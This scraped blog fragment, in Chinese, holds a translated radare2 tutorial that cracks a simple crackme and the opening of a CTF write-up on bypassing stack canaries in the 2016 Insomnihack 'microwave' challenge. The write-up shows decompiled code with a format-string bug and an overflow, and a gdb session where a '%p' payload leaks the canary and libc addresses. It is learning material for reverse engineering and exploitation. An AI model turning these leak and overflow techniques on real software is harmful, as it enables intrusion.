::.Think you can make it?Nop, Wrong argument. 第一次跑的时候，输出了Nop, Wrong argument。假设我们需要提供一个参数，第二次输入abcdef作为参数，依旧失败了。显然需要特定的字符串才能绕过。 让我们用radare2来测试程序： 123$ r2 ./megabeets_0x1 — Thank you for using radare2. Have a nice night![0x08048370]&gt; 我们生成了一个radare2的 shell，还有一个欢迎界面。我们可以执行fo来输出一个新的句子，有些很搞笑同时有些也很有趣。现在r2的 shell 正在等着我们输入命令，并且展示给我们此刻所在的地址（0x08048370）。默认情况下我们自动在入口点处。让我们看看是否正确： 123[0x08048370]&gt; ie[Entrypoints]vaddr=0x08048370 paddr=0x00000370 baddr=0x08048000 laddr=0x00000000 haddr=0x00000018 type=program1 entrypoints 我们使用ie命令输出了文件的入口点地址。r2命令有一系列有意义的字母。在这个例子里，ie代表了info &gt;&gt; entrypoint。因此在你熟悉了radare2的能力之后，命令都是比较好记的。但是你不需要记住所有的命令——你可以仅仅需要在（几乎）每个字母后面加上?来获得命令的信息以及它的子命令。 12345678910111213141516171819202122232425262728293031323334[0x08048370]&gt; i?|Usage: i Get info from opened file (see rabin2’s manpage)| Output mode:| ‘*’ Output in radare commands| ‘j’ Output in json| ‘q’ Simple quiet output| Actions:| i|ij Show info of current file (in JSON)| iA List archs| ia Show all info (imports, exports, sections..)| ib Reload the current buffer for setting of the bin (use once only)| ic List classes, methods and fields| iC Show signature info (entitlements, …)| id Debug information (source lines)| iD lang sym demangle symbolname for given language| ie Entrypoint| iE Exports (global symbols)| ih Headers (alias for iH)| iHH Verbose Headers in raw text| ii Imports| iI Binary info| ik [query] Key-value database from RBinObject| il Libraries| iL List all RBin plugins loaded| im Show info about predefined memory allocation| iM Show main address| io [file] Load info from file (or last opened) use bin.baddr| ir|iR Relocs| is Symbols| iS [entropy,sha1] Sections (choose which hash algorithm to use)| iV Display file version info| iz Strings in data sections| izz Search for Strings in the whole binary| iZ Guess size of binary program i命令目的是从打开的文件中获取信息，它就是集成到radare2的 shell 里的rabin2（之前提到的）。 分析默认情况下radare2不会自动分析文件，因为分析文件是一个复杂的过程，尤其是比较大的文件。了解更多关于分析的内容，你可以看一看在radare2博客上的这篇文章。 显然分析仍然是可能的，r2提供了许多种类的分析方式。正如我之前提到的，我们可以通过对a命令后面添加?来查找分析选项。 1234567891011121314151617181920212223242526[0x08048370]&gt; a?|Usage: a[abdefFghoprxstc] […]| ab [hexpairs] analyze bytes| abb [len] analyze N basic blocks in [len] (section.size by default)| aa[?] analyze all (fcns + bbs) (aa0 to avoid sub renaming)| ac[?] [cycles] analyze which op could be executed in [cycles]| ad[?] analyze data trampoline (wip)| ad [from] [to] analyze data pointers to (from-to)| ae[?] [expr] analyze opcode eval expression (see ao)| af[?] analyze Functions| aF same as above, but using anal.depth=1| ag[?] [options] output Graphviz code| ah[?] analysis hints (force opcode size, …)| ai [addr] address information (show perms, stack, heap, …)| ao[?] [len] analyze Opcodes (or emulate it)| aO Analyze N instructions in M bytes| ar[?] like ‘dr’ but for the esil vm. (registers)| ap find prelude for current offset| ax[?] manage refs/xrefs (see also afx?)| as[?] [num] analyze syscall using dbg.reg| at[?] [.] analyze execution tracesExamples:f ts @ S*~text:0[3]; f t @ section..textf ds @ S*~data:0[3]; f d @ section..data.ad t t+ts @ d:ds 我通常开始分析时会执行aa（analyse all）。这个名称有一点容易误解，因为除此之外还有很多可以分析的（执行aa?可以看到更多的用法），但对于这个程序来说已经足够了。这次我们直接执行aaa，更简单些。你也可以执行radare2用-A参数来分析文件，直接在开始就执行aaa（例如r2 -A megabeets_0x1） 123456[0x08048370]&gt; aaa[x] Analyze all flags starting with sym. and entry0 (aa)[x] Analyze len bytes of instructions for references (aar)[x] Analyze function calls (aac)[*] Use -AA or aaaa to perform additional experimental analysis.[x] Constructing a function name for fcn.* and sym.func.* functions (aan) 标志在分析之后，radare2把一些特定的名字和偏移联系在一起，例如区段、函数、符号表、字符串等等。他们被称作为标志。标志被整合进标志空间，一个标志空间是所有类似特征的标志的集合。执行fs以查看所有的标志： 1234567[0x08048370]&gt; fs0 4 . strings1 35 . symbols2 82 . sections3 5 . relocs4 5 . imports5 1 . functions 我们可以使用fs &lt;flagspace&gt;来查看某个特定的标志空间，然后用f输出所有的标志。我们使用分号将一行中的多个命令分开（比如命令一; 命令二; 命令三;...）。 123456[0x08048370]&gt; fs imports; f0x08048320 6 sym.imp.strcmp0x08048330 6 sym.imp.strcpy0x08048340 6 sym.imp.puts0xffffffff 16 loc.imp.__gmon_start__0x08048350 6 sym.imp.__libc_start_main 正如我们所看到的，radare2将所有程序所使用的导入表输出——可以看到我们所熟悉的strcmp、strcpy、puts等，包括相关的地址。我们也可以列出字符串的标志空间。 12345[0x08048370]&gt; fs strings; f0x08048700 21 str._n__.::_Megabeets_::.0x08048715 23 str.Think_you_can_make_it_0x0804872c 10 str.Success__n0x08048736 22 str.Nop__Wrong_argument._n 字符串我们看到r2列出了一些字符串的偏移，还有一些变量名。让我们主要来看看字符串。有很多可以列出程序中字符串的方式，你可以选择你最需要的一种。iz – 列出在数据短的字符串izz – 在整个程序中查找字符串 12345[0x08048370]&gt; izvaddr=0x08048700 paddr=0x00000700 ordinal=000 sz=21 len=20 section=.rodata type=ascii string=\\n .:: Megabeets ::.vaddr=0x08048715 paddr=0x00000715 ordinal=001 sz=23 len=22 section=.rodata type=ascii string=Think you can make it?vaddr=0x0804872c paddr=0x0000072c ordinal=002 sz=10 len=9 section=.rodata type=ascii string=Success!\\nvaddr=0x08048736 paddr=0x00000736 ordinal=003 sz=22 len=21 section=.rodata type=ascii string=Nop, Wrong argument.\\n 我们已经熟悉了大部分字符串——还记得我们一开始运行程序时的那几行字符串吧。但是我们没有看到Success，这应该是我们输入正确字符串后的提示。既然我们已经得到了字符串，让我们看看它们在程序的什么地方被使用了。 12345[0x08048370]&gt; axt @@ str.*data 0x8048609 push str._n__.::_Megabeets_::. in maindata 0x8048619 push str.Think_you_can_make_it_ in maindata 0x8048646 push str._n_tSuccess__n in maindata 0x8048658 push str._n_tNop__Wrong_argument._n in main 这个命令展示给我们radare2更多的特点。axt命令用来在数据段或程序段交叉查找某个地址（试试ax?）。@@是一个迭代器标志，用来在一段偏移上重复某个命令（试试@@?）。str.*是一个对所有开头为str.的标志的通配。这条命令能帮助我列出字符串标志以及对应所在的函数名。在这之前要确保选择了字符串的标志空间（默认时是fs *）。 定位正如我之前所说的，之前我们一直在程序的入口点，现在应该去其他地方看看了。我们刚列出来的字符串都是在main函数中的。为了定位到字符串，我们需要使用seek命令，用s替代。正如大家所知道的，在（几乎）每个命令后加上?会解决你所有的问题。 123456789101112131415161718192021222324[0x08048370]&gt; s?|Usage: s # Seek commands| s Print current address| s addr Seek to address| s- Undo seek| s- n Seek n bytes backward| s– Seek blocksize bytes backward| s+ Redo seek| s+ n Seek n bytes forward| s++ Seek blocksize bytes forward| s[j*=] List undo seek history (JSON, =list, *r2)| s/ DATA Search for next occurrence of ‘DATA’| s/x 9091 Search for next occurrence of \\x90\\x91| s.hexoff Seek honoring a base from core-&gt;offset| sa [[+-]a] [asz] Seek asz (or bsize) aligned to addr| sb Seek aligned to bb start| sC[?] string Seek to comment matching given string| sf Seek to next function (f-&gt;addr+f-&gt;size)| sf function Seek to address of specified function| sg/sG Seek begin (sg) or end (sG) of section or file| sl[?] [+-]line Seek to line| sn/sp Seek next/prev scr.nkey| so [N] Seek to N next opcode(s)| sr pc Seek to register seek命令是接收一个地址或是一个数学表达式作为参数。这个表达式可以是数学运算、标志或者内存访问操作。我们可以执行s main来定位到 main 函数。让我们先通过afl命令（Analyze Functions List）来查看radare2为我们列出了哪些函数。 12345678910111213141516171819[0x08048370]&gt; afl0x080482ec 3 35 sym._init0x08048320 1 6 sym.imp.strcmp0x08048330 1 6 sym.imp.strcpy0x08048340 1 6 sym.imp.puts0x08048350 1 6 sym.imp.__libc_start_main0x08048360 1 6 sub.__gmon_start___252_3600x08048370 1 33 entry00x080483a0 1 4 sym.__x86.get_pc_thunk.bx0x080483b0 4 43 sym.deregister_tm_clones0x080483e0 4 53 sym.register_tm_clones0x08048420 3 30 sym.__do_global_dtors_aux0x08048440 4 43 -&gt; 40 sym.frame_dummy0x0804846b 19 282 sym.rot130x08048585 1 112 sym.beet0x080485f5 5 127 main0x08048680 4 93 sym.__libc_csu_init0x080486e0 1 2 sym.__libc_csu_fini0x080486e4 1 20 sym._fini 这些导入函数正是我们之前所看到的，包括入口点、libc、main 函数和两个引人注意的函数分别叫做sym.beet和sym.rot13。 反汇编main 函数是时候去看看汇编代码了。首先我们用s main来定位到 main 函数，然后用pdf命令（Print Disassemble Function）来反汇编。注意地址是怎么准确地变成 main 函数的地址的。 注意：正如我之前所说的，这篇文章的目的是教大家学习和了解radare2，而不是教汇编语言的。因此我不会彻底地解释代码。实际上，这个程序也很简单，你只要有一点点基础的逆向工程知识就能掌握。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354[0x08048370]&gt; s main[0x080485f5]&gt; pdf ;– main:/ (fcn) main 127| main ();| ; var int local_8h @ ebp-0x8| ; var int local_4h @ esp+0x4| ; DATA XREF from 0x08048387 (entry0)| 0x080485f5 8d4c2404 lea ecx, [esp + local_4h] ; 0x4| 0x080485f9 83e4f0 and esp, 0xfffffff0| 0x080485fc ff71fc push dword [ecx – 4]| 0x080485ff 55 push ebp| 0x08048600 89e5 mov ebp, esp| 0x08048602 53 push ebx| 0x08048603 51 push ecx| 0x08048604 89cb mov ebx, ecx| 0x08048606 83ec0c sub esp, 0xc| 0x08048609 6800870408 push str._n__.::_Megabeets_::. ; str._n__.::_Megabeets_::.| 0x0804860e e82dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048613 83c410 add esp, 0x10| 0x08048616 83ec0c sub esp, 0xc| 0x08048619 6815870408 push str.Think_you_can_make_it_ ; “Think you can make it?” @ 0x8048715| 0x0804861e e81dfdffff call sym.imp.puts ; int puts(const char *s)| 0x08048623 83c410 add esp, 0x10| 0x08048626 833b01 cmp dword [ebx], 1 ; [0x1:4]=0x1464c45| ,=&lt; 0x08048629 7e2a jle 0x8048655| | 0x0804862b 8b4304 mov eax, dword [ebx + 4] ; [0x4:4]=0x10101| | 0x0804862e 83c004 add eax, 4| | 0x08048631 8b00 mov eax, dword [eax]| | 0x08048633 83ec0c sub esp, 0xc| | 0x08048636 50 push eax| | 0x08048637 e849ffffff call sym.beet| | 0x0804863c 83c410 add esp, 0x10| | 0x0804863f 85c0 test eax, eax| ,==&lt; 0x08048641 7412 je 0x8048655| || 0x08048643 83ec0c sub esp, 0xc| || 0x08048646 682c870408 push str.Success__n ; “Success!.” @ 0x804872c| || 0x0804864b e8f0fcffff call sym.imp.puts ; int puts(const char *s)| || 0x08048650 83c410 add esp, 0x10| ,===&lt; 0x08048653 eb10 jmp 0x8048665| ||| ; JMP XREF from 0x08048629 (main)| ||| ; JMP XREF from 0x08048641 (main)| |-&gt; 0x08048655 83ec0c sub esp, 0xc| | 0x08048658 6836870408 push str.Nop__Wrong_argument._n ; “Nop, Wrong argument..” @ 0x8048736| | 0x0804865d e8defcffff call sym.imp.puts ; int puts(const char *s)| | 0x08048662 83c410 add esp, 0x10| | ; JMP XREF from 0x08048653 (main)| `—&gt; 0x08048665 b800000000 mov eax, 0| 0x0804866a 8d65f8 lea esp, [ebp – local_8h]| 0x0804866d 59 pop ecx| 0x0804866e 5b pop ebx| 0x0804866f 5d pop ebp| 0x08048670 8d61fc lea esp, [ecx – 4]\\ 0x08048673 c3 ret 看过汇编代码后，我们可以写出一段简单的伪代码： 12345678910111213if (argc &gt; 1 &amp;&amp; beet(argv[1]) == true)# i.e - if any argument passed to the program AND the result of beet, given the passed argument, is true# argc is the number of arguments passed to the program# argc will be at least 1 becuase the first argument is the program name# argv is the array of parameters passed to the program&#123; print \"success\"&#125;else&#123; print \"fail\"&#125;exit 可视化模式和图形模式radare2有着一个非常强大、效率极高的可视化模式。可视化模式对用户非常友好并且将使用r2的逆向过程带到了一个新的高度。按下V键开启可视化模式。按下p/P键用来切换模式。在屏幕的最上方可以看到你输入的命令。这里按p可以切换回原来的反汇编模式。 可视化模式基本命令移动你可以通过k向上移动，通过j向下移动。回车键可以jmp或者call到目标地址。同时在每个jmp或call右侧注释的方括号中有数字，直接按相应的数字可跳转到对应地址。 帮助正如之前命令行下的radare2，按下?可以为你展现帮助窗口，你可以学习可视化模式下的各个命令。 交叉引用用x/X分别来列出当前函数的引用和调用的情况。按下对应数字来跳转。 radare2命令使用：在可视化模式下输入:command来执行r2命令 注释你可以通过;[-]comment来添加或删去注释。 标记m&lt;key&gt;可以用来标记特定的偏移地址。&#39;&lt;key&gt;来跳到指定地址。 退出按下q键返回到r2的 shell。 可视化图形模式和其他的一些反汇编器一样，radare2也有图形视图。你可以输入VV从 shell 进入图形视图，通过k/j/h/l向上/下/左/右移动，按g键跳转到目标函数（例如gd）。 按?来列出所有的命令，其中R命令值得一学。 反汇编beet函数接下来回到反汇编函数上，看看beet函数。正如我们之前所看到的，我们的程序检查了beet的返回结果，也就是我们输入的参数。我们可以通过一些方式输出beet的返回值，这里列出几种： 在r2的 shell 中定位到beet函数，然后通过s sym.beet（sym.beet是beet函数的一个标志。你可以通过f sym.&lt;tab&gt;输出出sym的标志）输出函数，然后执行pdf（Print Disassemble Function）； 在r2的 shell 下，通过pdf @ sym.beet输出beet函数。@是临时的定位（输出sym.beet地址处的函数）； 可视化模式下在 main 函数下跳到beet函数； 可视化图形界面下在 main 函数中使用gd（d是call边上的字母） 这是beet函数在图形视图下的样子： 我们可以看到输入的参数被复制给了一个缓冲空间。缓存区的位置在ebp - local_88h。local_88h其实是 0x88，也就是十进制的 136。在可视化模式下，我们可以用:执行r2的命令? 0x88查看。 12:&gt; ? 0x88136 0x88 0210 136 0000:0088 136 “\\x88” 10001000 136.0 136.000000f 136.000000 由于 4 个字节保存了前一个栈帧的 ebp 值，接下来的 4 个字节则是返回地址，因此在栈上的缓冲区大小为 128 个字节，总共为 136 个字节。 在缓冲区之后是我们输入的参数，它和函数sym.rot13的结果进行比较。Rot-13是一个著名的置换加密，经常在 CTF 以及 Crackme 中使用。这个函数接收了 9 个十六进制数，看起来radare2没有把它们识别成一个字符串。我们可以在其地址上执行ahi s。 1:&gt; ahi s @@=0x080485a3 0x080485ad 0x080485b7 ahi s用来将将具体地址转换成字符串（试试ahi?）。@@是一个迭代器（试试@@），然后这些地址则是sym.beet函数中没被radare2识别成字符串的部分。执行完这条命令后，图形视图会自动刷新（如果没有自动刷新，执行r）成这样： 看起来没被识别出来的字符串是Megabeets（根据字节序反向压栈得到）。 该程序通过strcmp将经过 rot13 处理后的Megabeets与我们输入的参数进行比较。幸运的是我们不需要辛苦地分析 rot13 的具体算法，因为r2框架中的rahash2工具已经包含了 rot13 加密。 rahash2通过不同的算法计算文件或是字符串的校验值。 使用man rahash2查看更多的用法。 12:&gt; !rahash2 -E rot -S s:13 -s ‘Megabeets\\n’Zrtnorrgf rahash2执行了rot13(“Megabeets”)后得到了字符串Zrtnorrgf。输入!可以在r2的 shell 下执行系统命令。我们假设Zrtnorrgf就是要和我们的输入进行比较的字符串。让我们在调试模式下打开程序，使用ood（试试ood?）并将Zrtnorrgf作为参数，看看我们会得到什么。 12345678910111213[0xf7749be9]&gt; ood?| ood [args] reopen in debugger mode (with args)[0xf7749be9]&gt; ood ZrtnorrgfWait event received by different pid 7415Wait event received by different pid 7444Process with PID 7575 started…File dbg:///home/remnux/Desktop/tutorials/megabeets_0x1 Zrtnorrgf reopened in read-write mode= attach 7575 7575Assuming filepath /home/remnux/Desktop/tutorials/megabeets_0x1[0xf7749be9]&gt; dcSelecting and continuing: 7575.:: Megabeets ::.Think you can make it?Success!PTRACE_EVENT_EXIT pid=7575, status=0x0 我们收到了成功的提示，破解了这个 Crackme。在成功破解之后，我们终于可以说这个程序就是将我们输入的第一个参数与rot13(“Megabeets”)进行了比较，也就是Zrtnorrgf。 你可以在这里查看 Crackme 的完整源码。 后记Radare2之旅第一部分就告一段落了。我们只接触了radare2的表皮，仅仅了解了它最最基础的一些功能。在下一部分中，我们将会学习更多的关于radare2的功能，包括脚本处理、恶意软件分析和漏洞利用。我知道对于很多人来说一开始是很难的，不管是能否感受到radare2的强大之处，亦或是将你的以前的习惯放到一边而熟悉使用radare2。不管你是一个逆向工程师、一个 CTF 比赛选手或者只是一个安全爱好者，我敢保证将radare2收入你的工具箱绝对一个是明智的选择。","categories":[],"tags":[{"name":"re","slug":"re","permalink":"qianfei11.coding.me/tags/re/"},{"name":"translation","slug":"translation","permalink":"qianfei11.coding.me/tags/translation/"}]},{"title":"绕过ELF的安全防护机制Canary","slug":"绕过ELF的安全防护机制Canary","date":"2019-02-15T08:21:43.000Z","updated":"2019-08-26T05:55:00.833Z","comments":true,"path":"2019/02/15/绕过ELF的安全防护机制Canary/","link":"","permalink":"qianfei11.coding.me/2019/02/15/绕过ELF的安全防护机制Canary/","excerpt":"入门 canary。","text":"入门 canary。 何为 Canary由于stack overflow而引发的攻击非常普遍也非常古老，相应地一种叫做Canary的技术很早就出现在glibc里，直到现在也作为系统安全的第一道防线存在。Canary的意思是金丝雀，来源于英国矿井工人用来探查井下气体是否有毒的金丝雀笼子。工人们每次下井都会带上一只金丝雀如果井下的气体有毒，金丝雀由于对毒性敏感就会停止鸣叫甚至死亡，从而使工人们得到预警。这个概念应用在栈保护上则是在初始化一个栈帧时在栈底设置一个随机的 canary 值，栈帧销毁前测试该值是否死掉，即是否被改变，若被改变则说明栈溢出发生，程序走另一个流程结束，以免漏洞利用成功。Canary不管是实现还是设计思想都比较简单高效，就是插入一个值，在stack overflow发生的高危区域的尾部，当函数返回之时检测Canary的值是否经过了改变，以此来判断stack/buffer overflow是否发生。Canary与 Windows 下的GS保护都是防止栈溢出的有效手段，它的出现很大程度上防止了栈溢出的出现，并且由于它几乎并不消耗系统资源，所以现在成了linux下保护机制的标配。 以 32 位程序为例。没开 Canary 时的栈： 1234567891011+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| ebp |+------------------+| return addr |+------------------+ 开启 Canary 后的栈： 12345678910111213+------------------+| parameter |+------------------+| local var1 |+------------------+| local var2 |+------------------+| canary | &lt;- Random+------------------+| ebp |+------------------+| return addr |+------------------+ 在EBP之前增加了一个不可预测的随机值并在程序中，而且在程序结尾处会检测Canary是否被篡改。如果发生了缓冲区溢出覆盖了返回地址则肯定会覆盖Canary，这时程序会直接退出。只有泄漏了Canary，才能 overflow 后面的 return address： 123456789 0x804852b &lt;func+71&gt;: mov eax,DWORD PTR [ebp-0xc] 0x804852e &lt;func+74&gt;: xor eax,DWORD PTR gs:0x14=&gt; 0x8048535 &lt;func+81&gt;: je 0x804853c &lt;func+88&gt; | 0x8048537 &lt;func+83&gt;: call 0x8048390 &lt;__stack_chk_fail@plt&gt; | 0x804853c &lt;func+88&gt;: leave | 0x804853d &lt;func+89&gt;: ret | 0x804853e &lt;main&gt;: lea ecx,[esp+0x4] |-&gt; 0x804853c &lt;func+88&gt;: leave 0x804853d &lt;func+89&gt;: ret 如果没有绕过Canary，就会call到 glibc 中的函数__stack_chk_fail： 1234567891011void __attribute__ ((noreturn)) __stack_chk_fail (void)&#123; __fortify_fail (\"stack smashing detected\");&#125;void __attribute__ ((noreturn)) internal_function __fortify_fail (const char *msg)&#123; /* The loop is added only to keep gcc happy. */ while (1) __libc_message (2, \"*** %s ***: %s terminated\\n\", msg, __libc_argv[0] ?: \"&lt;unknown&gt;\");&#125; Canary绕过技术泄漏CanaryCanary设计为以字节\\x00结尾，本意是为了保证Canary可以截断字符串。泄露栈中的Canary的思路是覆盖Canary的低字节，来打印出剩余的Canary部分。这种利用方式需要存在合适的输出函数，并且可能需要第一溢出泄露Canary，之后再次溢出控制执行流程。如果存在format string那么还可以泄漏Canary。 2016-insomnihack-microwavechecksec一下程序，64 位 elf，保护全开： 1234567[*] '/home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave' Arch: amd64-64-little RELRO: Full RELRO Stack: Canary found NX: NX enabled PIE: PIE enabled FORTIFY: Enabled 拖进 ida 查看一下程序。程序大概上是连接 tweeter 账户，编辑内容，发布最喜爱食物： 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859void __fastcall __noreturn main(__int64 a1, char **a2, char **a3)&#123; char *v3; // r12 char input; // [rsp+0h] [rbp-38h] unsigned __int64 v5; // [rsp+8h] [rbp-30h] v5 = __readfsqword(0x28u); setbuf(stdout, 0LL); v3 = (char *)malloc(0x3EuLL); puts(\"\\n --------------------------------------------------------\"); puts(\" | Welcome to the next generation of MicroWaves! |\"); puts(\" | *** |\"); puts(\" | This stylish Microwave with Grill function, includes |\"); puts(\" | a function that tweets your favourite food! |\"); puts(\" | *** |\"); puts(\" --------------------------------------------------------\"); fflush(0LL); while ( 1 ) &#123; while ( 1 ) &#123; choice(); fwrite(\"\\n [MicroWave]: \", 1uLL, 0x19uLL, stdout); fgets(&amp;input, 3, stdin); if ( input != '2' ) break; if ( *((_WORD *)v3 + 30) == 1 ) edit(); else fwrite(\"\\n First: please connect to your Twitter account!\\n\\n\", 1uLL, 0x37uLL, stdout); &#125; if ( input &lt;= '2' ) &#123; if ( input == '1' ) // choice 1 &#123; fwrite(\"\\n Log in on Twitter:\\n\", 1uLL, 0x1FuLL, stdout); fwrite(\" username: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3, 40, stdin); fwrite(\" password: \", 1uLL, 0x15uLL, stdout); fflush(0LL); fgets(v3 + 40, 20, stdin); connect(v3); &#125; &#125; else if ( input == '3' ) // choice 3 &#123; if ( *((_WORD *)v3 + 30) == 1 ) tweet(); else fwrite(\"\\n Hey Dude! This didn't work out!\\n\\n\", 1uLL, 0x28uLL, stdout); &#125; else if ( input == 'q' ) // quit &#123; fwrite(\"\\n Bye!\\n\\n\", 1uLL, 0x12uLL, stdout); exit(0); &#125; &#125;&#125; 在connect()函数中，发现了一个需要过的 check 密码，同时还有用户名的输入存在format string，故这里可以泄漏出栈上的Canary： 12345678910111213141516171819202122232425262728293031323334353637unsigned __int64 __fastcall connect(char *input)&#123; size_t j; // rbx char *string; // rbx size_t v3; // rax __int64 i; // rdx unsigned __int64 v6; // [rsp+8h] [rbp-20h] j = 1LL; v6 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\nChecking \"); __printf_chk(1LL, (__int64)input); puts(\"Twitter account\"); fflush(0LL); while ( j &lt; strlen(input + 40) ) &#123; ++j; putchar('.'); fflush(0LL); usleep(0x186A0u); &#125; putchar('\\n'); string = password; v3 = strlen(password); for ( i = 0LL; ; ++i ) &#123; if ( i == v3 ) &#123; *((_WORD *)input + 30) = 1; return __readfsqword(0x28u) ^ v6; &#125; if ( input[i + 40] != string[i] ) break; &#125; *((_WORD *)input + 30) = 0; return __readfsqword(0x28u) ^ v6;&#125; 在edit()函数中存在buffer overflow，读了很长一串字符： 123456789101112unsigned __int64 edit()&#123; __int64 v1; // [rsp+0h] [rbp-418h] unsigned __int64 v2; // [rsp+408h] [rbp-10h] v2 = __readfsqword(0x28u); __printf_chk(1LL, (__int64)\"\\n #&gt; \"); fflush(0LL); read(0, &amp;v1, 0x800uLL); puts(\"\\n Done.\"); return __readfsqword(0x28u) ^ v2;&#125; 同时通过调试可以找到栈上的某个值与 libc 的偏移，以用来计算 base： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115assassinq@ubuntu ~/pwn/ctf-wiki/canary/2016-insomnihack-microwave$ gdb ./microwaveGNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1Copyright (C) 2016 Free Software Foundation, Inc.License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;This is free software: you are free to change and redistribute it.There is NO WARRANTY, to the extent permitted by law. Type &quot;show copying&quot;and &quot;show warranty&quot; for details.This GDB was configured as &quot;x86_64-linux-gnu&quot;.Type &quot;show configuration&quot; for configuration details.For bug reporting instructions, please see:&lt;http://www.gnu.org/software/gdb/bugs/&gt;.Find the GDB manual and other documentation resources online at:&lt;http://www.gnu.org/software/gdb/documentation/&gt;.For help, type &quot;help&quot;.Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;...Reading symbols from ./microwave...(no debugging symbols found)...done.assassinq&gt;&gt; set environment LD_LIBRARY_PATH=./libc.so.6assassinq&gt;&gt; rStarting program: /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave -------------------------------------------------------- | Welcome to the next generation of MicroWaves! | | *** | | This stylish Microwave with Grill function, includes | | a function that tweets your favourite food! | | *** | -------------------------------------------------------- ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: 1 Log in on Twitter: username: %p.%p.%p.%p.%p.%p.%p.%p password: n07_7h3_fl46Checking 0x7ffff7dd3780.0x7ffff7b042c0.0x7ffff7fd8700.0xa.(nil).0x82f154bf635c9900.0x7ffff7dd2708.0x7ffff7dd2710Twitter account............ ---------------------------------- | 1. Connect to Twitter account | | 2. Edit your tweet | | 3. Grill &amp; Tweet your food | | q. Exit | ---------------------------------- [MicroWave]: ^CProgram received signal SIGINT, Interrupt.[----------------------------------registers-----------------------------------]RAX: 0xfffffffffffffe00RBX: 0x7ffff7dd18e0 --&gt; 0xfbad2288RCX: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)RDX: 0x400RSI: 0x555555759060 (&quot;n07_7h3_fl46\\np.%p.%p.%p\\n&quot;)RDI: 0x0RBP: 0x7ffff7dd2620 --&gt; 0xfbad2887RSP: 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)RIP: 0x7ffff7b04260 (&lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001)R8 : 0x7ffff7dd3780 --&gt; 0x0R9 : 0x7ffff7fd8700 (0x00007ffff7fd8700)R10: 0x7ffff7fd8700 (0x00007ffff7fd8700)R11: 0x246R12: 0xa (&apos;\\n&apos;)R13: 0x2R14: 0x55555575906d (&quot;p.%p.%p.%p\\n&quot;)R15: 0x7ffff7dd18e0 --&gt; 0xfbad2288EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)[-------------------------------------code-------------------------------------] 0x7ffff7b04257 &lt;read+7&gt;: jne 0x7ffff7b04269 &lt;read+25&gt; 0x7ffff7b04259 &lt;__read_nocancel&gt;: mov eax,0x0 0x7ffff7b0425e &lt;__read_nocancel+5&gt;: syscall=&gt; 0x7ffff7b04260 &lt;__read_nocancel+7&gt;: cmp rax,0xfffffffffffff001 0x7ffff7b04266 &lt;__read_nocancel+13&gt;: jae 0x7ffff7b04299 &lt;read+73&gt; 0x7ffff7b04268 &lt;__read_nocancel+15&gt;: ret 0x7ffff7b04269 &lt;read+25&gt;: sub rsp,0x8 0x7ffff7b0426d &lt;read+29&gt;: call 0x7ffff7b220d0 &lt;__libc_enable_asynccancel&gt;[------------------------------------stack-------------------------------------]0000| 0x7fffffffda28 --&gt; 0x7ffff7a875e8 (&lt;_IO_new_file_underflow+328&gt;: cmp rax,0x0)0008| 0x7fffffffda30 --&gt; 0x7ffff7dd26a3 --&gt; 0xdd3780000000000a0016| 0x7fffffffda38 --&gt; 0x7ffff7dd18e0 --&gt; 0xfbad22880024| 0x7fffffffda40 --&gt; 0x7fffffffdae0 --&gt; 0x7fffff000a310032| 0x7fffffffda48 --&gt; 0x7ffff7a8860e (&lt;__GI__IO_default_uflow+14&gt;: cmp eax,0xffffffff)0040| 0x7fffffffda50 --&gt; 0x00048| 0x7fffffffda58 --&gt; 0x7ffff7a7bc6a (&lt;__GI__IO_getline_info+170&gt;: cmp eax,0xffffffff)0056| 0x7fffffffda60 --&gt; 0x19[------------------------------------------------------------------------------]Legend: code, data, rodata, valueStopped reason: SIGINT0x00007ffff7b04260 in __read_nocancel () at ../sysdeps/unix/syscall-template.S:8484 ../sysdeps/unix/syscall-template.S: No such file or directory.assassinq&gt;&gt; vmmapStart End Perm Name0x0000555555554000 0x0000555555557000 r-xp /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555757000 0x0000555555758000 r--p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555758000 0x0000555555759000 rw-p /home/assassinq/pwn/ctf-wiki/canary/2016-insomnihack-microwave/microwave0x0000555555759000 0x000055555577a000 rw-p [heap]0x00007ffff7a0d000 0x00007ffff7bcd000 r-xp /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7bcd000 0x00007ffff7dcd000 ---p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dcd000 0x00007ffff7dd1000 r--p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd1000 0x00007ffff7dd3000 rw-p /lib/x86_64-linux-gnu/libc-2.23.so0x00007ffff7dd3000 0x00007ffff7dd7000 rw-p mapped0x00007ffff7dd7000 0x00007ffff7dfd000 r-xp /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7fd7000 0x00007ffff7fda000 rw-p mapped0x00007ffff7ff7000 0x00007ffff7ffa000 r--p [vvar]0x00007ffff7ffa000 0x00007ffff7ffc000 r-xp [vdso]0x00007ffff7ffc000 0x00007ffff7ffd000 r--p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffd000 0x00007ffff7ffe000 rw-p /lib/x86_64-linux-gnu/ld-2.23.so0x00007ffff7ffe000 0x00007ffff7fff000 rw-p 